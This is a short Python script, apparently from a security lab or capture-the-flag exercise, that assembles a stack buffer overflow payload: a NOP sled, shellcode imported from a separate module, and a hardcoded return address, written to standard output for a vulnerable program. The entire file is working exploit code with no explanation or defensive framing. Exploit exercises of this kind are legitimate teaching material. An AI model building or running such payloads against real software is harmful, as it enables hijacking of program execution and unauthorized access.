import sys
import struct
from shellcode import shellcode

#need to run with quotes
noOpSled = b'\x90'*59
data = noOpSled
data += shellcode
data += struct.pack('<I', 0xbffeb420)
sys.stdout.buffer.write(data)
